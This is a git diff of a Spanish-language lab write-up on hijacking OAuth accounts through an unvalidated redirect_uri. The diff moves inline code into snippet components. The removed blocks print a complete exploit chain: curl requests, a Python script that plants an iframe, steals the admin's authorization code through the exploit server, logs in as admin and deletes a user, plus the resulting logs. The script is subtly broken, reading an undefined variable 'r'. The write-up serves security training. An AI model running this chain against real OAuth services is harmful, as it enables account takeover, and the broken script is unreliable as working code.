@@ -10,6 +10,7 @@ lang: "es"
 
 import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../../components/PartialContainer.astro';
+import CodeSnippet from '../../../components/CodeSnippet.astro';
 
 ## Conceptos Previos Necesarios Para Resolver El Lab
 
@@ -22,9 +23,7 @@ import PartialContainer from '../../../components/PartialContainer.astro';
 
 Primero exploremos el lab y entendamos la estructura de la aplicación:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/" | cat
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/01-bash.sh" />
 
 > **Desglose del comando**: \
 `-s` = modo silencioso (sin barra de progreso) \
@@ -32,48 +31,30 @@ curl -s "https://<lab-url>.web-security-academy.net/" | cat
 
 La página principal es un blog. En la cabecera de navegación encontramos:
 
-```html
-<a href=/>Home</a><p>|</p>
-<a href="/my-account">My account</a><p>|</p>
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/02-html.html" />
 
 También hay un enlace al servidor de exploits en el banner del lab:
 
-```html
-<a id='exploit-link' class='button' target='_blank'
-  href='https://exploit-<id>.exploit-server.net'>Go to exploit server</a>
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/03-html.html" />
 
 Sigamos el enlace "My account" para ver el flujo de login OAuth:
 
-```bash
-curl -s -D - "https://<lab-url>.web-security-academy.net/my-account"
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/04-bash.sh" />
 
 > **Desglose del comando**: \
 `-D -` = mostrar cabeceras de respuesta en stdout
 
 Respuesta:
 
-```
-HTTP/2 302
-location: /social-login
-set-cookie: session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/05-plain.http" />
 
 Redirige a `/social-login`. Sigamos la redirección:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/social-login" \
-  -b "session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP"
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/06-bash.sh" />
 
 La página contiene una etiqueta meta refresh que redirige al proveedor OAuth:
 
-```html
-<meta http-equiv=refresh content='3;url=https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email'>
-<p>We are now redirecting you to login with social media...</p>
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/07-html.html" />
 
 Esto nos dice todo sobre la configuración OAuth:
 
@@ -85,24 +66,15 @@ Esto nos dice todo sobre la configuración OAuth:
 
 Sigamos el flujo OAuth completo manualmente. Primero, accedamos al endpoint de autorización OAuth:
 
-```bash
-curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email"
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/08-bash.sh" />
 
 Respuesta:
 
-```
-HTTP/2 302
-location: /interaction/GSVAlvgrDIqNcFSmMcpkd
-set-cookie: _interaction=GSVAlvgrDIqNcFSmMcpkd; ...
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/09-plain.http" />
 
 El servidor OAuth redirige a una página de interacción (el formulario de login). Después de iniciar sesión con `wiener:peter` y confirmar el consentimiento, el servidor OAuth redirige de vuelta a:
 
-```
-HTTP/2 302
-location: https://<lab-url>.web-security-academy.net/oauth-callback?code=Gc5tqgJyU6dMHC23d7yvLoPxd3z9j2MOHU97Xc-YK33
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/10-plain.http" />
 
 El código de autorización se pasa en la URL al `redirect_uri`. Esta es la pieza crítica. Si podemos cambiar a dónde va esta redirección, podemos robar el código.
 
@@ -110,16 +82,11 @@ El código de autorización se pasa en la URL al `redirect_uri`. Esta es la piez
 
 Probemos si el proveedor OAuth valida el parámetro `redirect_uri` apuntándolo a nuestro servidor de exploits:
 
-```bash
-curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://exploit-<exploit-id>.exploit-server.net&response_type=code&scope=openid%20profile%20email"
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/11-bash.sh" />
 
 Respuesta:
 
-```
-HTTP/2 302
-location: /interaction/Mv8hr8rRWT08lq7hbcEqA
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/12-plain.http" />
 
 Sin errores en la respuesta. El servidor OAuth aceptó nuestro `redirect_uri` arbitrario sin ninguna validación. Esto significa que después de la autenticación, el código de autorización se enviará a cualquier URL que especifiquemos. Incluyendo nuestro servidor de exploits.
 
@@ -136,81 +103,7 @@ El plan de ataque:
 
 Hay demasiadas peticiones para hacerlo manualmente, así que mostraré el flujo con python:
 
-```python
-import requests
-import re
-import time
-
-LAB = "https://<lab-url>.web-security-academy.net"
-OAUTH = "https://oauth-<oauth-id>.oauth-server.net"
-EXPLOIT = "https://exploit-<exploit-id>.exploit-server.net"
-
-session_1 = requests.Session()
-
-# Step 1: Extract client_id from the lab's OAuth login link
-# The client_id is found in the meta refresh tag on the /my-account page
-response_1 = session_1.get(f"{LAB}/my-account")
-
-client_id = re.search(r'client_id=([a-zA-Z0-9]+)', r.text).group(1)
-
-print(f"Found client_id: {client_id}")
-
-# Step 2: Craft the malicious iframe
-# When loaded by the victim, it will initiate an OAuth flow
-# with redirect_uri pointing to our exploit server
-iframe_payload = (
-    f'<iframe src="{OAUTH}/auth?client_id={client_id}'
-    f'&redirect_uri={EXPLOIT}'
-    f'&response_type=code'
-    f'&scope=openid%20profile%20email"></iframe>'
-)
-
-# Step 3: Store the exploit on the exploit server
-session_1.post(f"{EXPLOIT}", data={
-    "urlIs498": "/exploit",
-    "responseFile": "/exploit",
-    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
-    "responseBody": iframe_payload,
-    "formAction": "STORE"
-})
-
-# Step 4: Deliver the exploit to the victim (admin)
-session_1.post(f"{EXPLOIT}", data={
-    "urlIs498": "/exploit",
-    "responseFile": "/exploit",
-    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
-    "responseBody": iframe_payload,
-    "formAction": "DELIVER_TO_VICTIM"
-})
-
-# Step 5: Wait for the victim to trigger the exploit
-time.sleep(3)
-
-# Step 6: Read the exploit server logs to extract the stolen code
-response_2 = session_1.get(f"{EXPLOIT}/log")
-
-stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text)
-
-if not stolen_code:
-    print("Failed to steal code")
-    exit(1)
-
-stolen_code = stolen_code.group(1)
-
-print(f"Stolen authorization code: {stolen_code}")
-
-# We create a new session (session_2) because we need a clean session context
-# The first session (session_1) was used for exploit server interactions and contains
-# cookies/state from the exploit server, not the target application
-session_2 = requests.Session()
-
-# Step 7: Use the stolen code to log in as admin
-session_2.get(f"{LAB}/oauth-callback?code={stolen_code}", allow_redirects=True)
-
-# Step 8: Access admin panel and delete carlos
-response_3 = session_2.get(f"{LAB}/admin/delete?username=carlos")
-print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete carlos")
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/13-python.py" />
 
 > **Desglose del script**: \
 > El script automatiza la cadena completa del exploit:
@@ -224,20 +117,11 @@ print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete c
 
 Salida esperada:
 
-```
-Stolen authorization code: OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa
-Carlos deleted
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/14-plain.txt" />
 
 Los logs del servidor de exploits muestran exactamente lo que pasó cuando la víctima admin cargó nuestro iframe malicioso:
 
-```
-10.0.3.152  2026-03-04 16:19:08 +0000 "GET /exploit/ HTTP/1.1" 200
-  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
-
-10.0.3.152  2026-03-04 16:19:08 +0000 "GET /?code=OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa HTTP/1.1" 200
-  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
-```
+<CodeSnippet file="oauth-account-hijacking-via-redirect-uri/15-plain.txt" />
 
 La primera petición es la víctima cargando la página del exploit. \
 La segunda es el proveedor OAuth redirigiendo el navegador de la víctima a nuestro servidor con el código de autorización. \
